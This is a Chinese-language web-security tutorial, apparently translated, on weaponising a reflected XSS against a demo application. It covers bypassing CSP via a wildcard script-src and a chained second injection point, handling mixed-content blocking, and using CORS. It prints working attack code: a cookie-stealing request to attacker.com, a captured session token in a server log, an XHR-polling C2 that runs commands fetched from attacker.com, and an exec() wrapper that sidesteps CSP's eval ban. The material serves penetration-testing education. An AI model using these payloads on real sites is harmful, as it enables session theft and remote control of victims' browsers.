            Hello 
我们可以使用``攻击该页面，如下所示：
    ?name=Bob
那么，如果目标返回如下CSP响应头，再次攻击时会出现什么情况？
    Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' *
我们的payload无法生效。这是因为默认情况下CSP会阻止内联JavaScript代码执行。为了让CSP支持内联代码，需要为`script-src`指令设置`unsafe-inline`。
那么如何绕过这个限制？这里我们可以看到加载脚本的策略为`script-src ‘self’ *`，需要注意一点，其中有个通配符（`*`）。`script-src`指令可以用来设置白名单，允许将外部JavaScript源加载到特定源。然而，这里的通配符表示任何外部JS源都可以从任何源来加载，既可以是`google.com`，也可以是`attacker.com`。
为了绕过该策略，我们可以将XSS
payload托管到我们恶意服务器（比如`attacker.com`）上的某个文件（比如`p`），然后在注入的`script`标签的`src`属性中加载这个payload，如下所示：
    # Hosted File: p ON attacker.com
    alert("Loaded from attacker.com");
    # XSS payload FOR demoapp.loc 
    ?name=Bob
## 0x05 CSP策略#2
好吧，上面这个例子实在太“弱智”了。我们可以尝试使用相同的payload，但这次面对的是如下CSP策略：
    Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' https://apis.provider-a.com
这个CSP策略想要绕过要更难一些，并且我们在实际环境中经常碰到这种情况（可能稍微有点变化）。我们再也无法执行内联JS，因此无法直接注入反射型XSS
payload。此外，现在我们也无法从应用自己的域之外加载JS源（除了`apis.provider-a.com`）。那么我们该怎么办？
我们需要找到能在目标应用服务器上将任意JS存放到某个文件的一种方法（永久存储或者临时存储都可以）。我们可以通过任意文件上传、存储型XSS、第二个反射型XSS点或者纯文本反射攻击点来完成该任务，但避免不了需要找到第二个漏洞。在这个例子中，我们准备将最初的反射型XSS攻击点与第二个注入漏洞点结合起来，但后者并不是一个XSS点。
来快速了解一下第二个问题：
    https://demoapp.loc/js/script?v=1.2.4
这里我们可以看到目标上有个脚本，会根据GET参数来加载特定版本的样式表。虽然这本身并不是一个反射型XSS点（因为我们可以在该页面中执行代码），但因为没有对输入进行验证，的确允许攻击者在应用的域中反射（临时存储的）任意JS。
    https://demoapp.loc/js/script?v=1.7.3.css”/>’);alert(1);//
为了绕过这个CSP策略，得到我们熟悉的`alert`框，我们可以将第二个注入URL点当成第一个XSS注入脚本的源（记得使用两层URL编码）：
    https://demoapp.loc/xss?name=Bob
## 0x06 HTTP及HTTPS混合
我们已经绕过了CSP，成功实现反射型XSS
PoC，现在我们可以窃取一些信息。我们使用python的`SimpleHTTPServer`模块搭建一个简单的HTTP服务器，创建一个新的JS
payload，通过异步HTTP请求（比如使用XMLHttpRequest，及XHR）来提取用户的cookie信息。事不宜迟，来试一下：
    var xhr=new XMLHttpRequest();
    xhr.open("GET", "http://attacker.com:8000/?"+document.cookie, true);
    xhr.send();
如上图所示，这种方法无法奏效，浏览器会完全阻止我们的请求。这是因为目标部署了“安全的”HTTPS网站，而该请求发往的是不安全的HTTP端点。这样一来就会在浏览器中触发内容混合型的strict-error。
这里我们需要注意一点，混合内容策略中存在一个例外。浏览器厂商认为通过未加密HTTP信道从当前主机加载内容是例外情况，这种场景与通过因特网加载HTTPS内容一样安全。因此，浏览器会将`127.0.0.1`（显式）加入白名单中，这样在本地测试时就无需部署SSL证书，也不会触发混合内容警告（注意，这种情况只适用于使用`127.0.0.1`这个IP地址，并不是本地IP或者本地主机名）。
我们可以使用浏览器控制台来测试，如下所示（现在先忽视CORS错误）：
    $ python -m SimpleHTTPServer...127.0.0.1 - - [17/Feb/2019 10:34:07] "GET /?token=Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjMzO3M6ODoidXNlcm5hbWUiO3M6NToiYWxpY2UiO3M6NToiZW1haWwiO3M6MTc6ImFsaWNlQGRlbW9hcHAubG9jIjt9--500573368be90e2717fa2aff1bfc5554;%20verified=yes HTTP/1.1" 200 –
然而，我们无法在实际攻击中使用`127.0.0.1`这个IP地址。根据我们想要达成的“目标”，在攻击过程中我们通常可以有两种选项：
1、如果我们需要发送POST请求，或者访问服务端的响应（例如XHR polling），那么我们需要使用TLS证书来配置自己的web服务器。
优点：解决所有问题。
缺点：配置起来优点麻烦。
2、如果我们不需要访问响应数据，一个GET请求就足够，那么我们只需要使用一个HTML image对象即可。
优点：不论是通过HTTP或者HTTPS，这种方法通常能实现加载。
缺点：并不是百分百可靠，控制台中会出现警告。
最终，设置互联网可访问的web服务器，搭配有效的SSL/TLS证书是目前最为推荐的解决方案。这种方案不单单适用于XSS，同时也适用于其他攻击场景，比如XXE、SSRF、CSRF、Blind
SQLI等。
## 0x07 利用CORS
来回顾一下，现在我们的状态为：
  * 实现反射型XSS
  * 通过结合两个相对无害的独立漏洞来绕过CSP
  * 放弃`SimpleHTTPServer`，使用Web Server+TLS解决混合内容错误
但我们仍然无法从web服务器获取数据。不过我们为什么要解决这个问题？毕竟我们的目的只是窃取某些cookie值。如果cookie受`HttpOnly`保护，而我们想利用用户会话，通过受害者浏览器来代理具体请求，那么该怎么做？我们可以更进一步，而不单单是提取cookie值。这里我们需要注入某种C2
payload，“hook”浏览器。比如使用如下XHR polling C2 PoC：
    function poll() {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange=()=>{
            if (xhr.readyState == 4 && xhr.status == 200) {
                var cmd = xhr.responseText;
                if (cmd.length > 0) { eval(cmd) };
            }   }
        xhr.open("GET", "https://attacker.com/?poll", true);
        xhr.send(); setTimeout(poll, 3000);
    }; poll();
这个payload会每隔`3`秒轮询（poll）我们的服务器，请求服务端“命令”，执行收到的HTTP响应body中的JavaScript。这里的问题在于，CORS策略不允许客户端读取响应，反过来也意味着我们无法将命令发送到被“hook”的页面：
在窃取数据时，CORS通常不是主要问题，因为CORS并没有阻止我们发送请求，只是会阻止客户端读取响应数据。然而当我们尝试将新数据载入某个应用时，这个就变成一个大问题了。
幸运的是，解决这个问题的主动权掌握在攻击者这边。我们只需要在C2服务器中添加适当的CORS响应头即可：
    Access-Control-Allow-Origin: https://demoapp.loc
现在如果我们在C2服务器上存放命令，那么XSS payload就可以获取该“命令”，尝试使用`eval()`执行该命令。来试一下：
好吧，真是好事多磨，没那么简单。
## 0x08 绕不开的CSP
当我们认为已经绕过CSP时，它又再次出现横插一脚。
能执行任意JS显然是非常强大的一个功能，这也是为什么我们需要显式在CSP策略中允许`unsafe-eval`的原因所在。在这个案例以及许多实际环境中往往不具备该条件。
那么如何执行JS呢？现在我们无法使用“内联”的JS、加载外部资源、使用`eval()`以及其他类似函数（如`timeout()`、`setInterval()`、`new
Function()`等）。
但我们已经可以执行任意JS，将最初的payload载入受害者浏览器中。因此我们可以将这个漏洞点包装成自定义的一个`exec()`函数，将其作为`eval()`的替代品。该函数的典型实现如下所示：
    function exec(cmd) {
        var s = document.createElement`script`;
        s.src = "js/script?v="+encodeURIComponent("1.2.3.css"/>');"+cmd+"//");
        with(document.body){appendChild(s);removeChild(s)};
    }
成功注入并完成设置后，我们可以通过如下方式，向hook的页面发送命令：
    $ ./c2.py -t demoapp.loc -s attacker.com –c ‘alert(“Hello from C2!”)’
将这个流程梳理一下，如下图所示，方便大家理解：
## 0x09 总结
本文简单介绍了在“实际环境”中利用XSS点时需要注意的几个常见坑。从理论上讲，介绍XSS
PoC的各种文章、书籍、博客等都非常优秀，但我发现实际利用中细节非常关键，并且很多时候我们都会忽略掉这些小细节。掌握这些细节后，我们可以放心向客户们演示XSS的危害以及真正价值，而不是简单的`alert(1)`弹窗。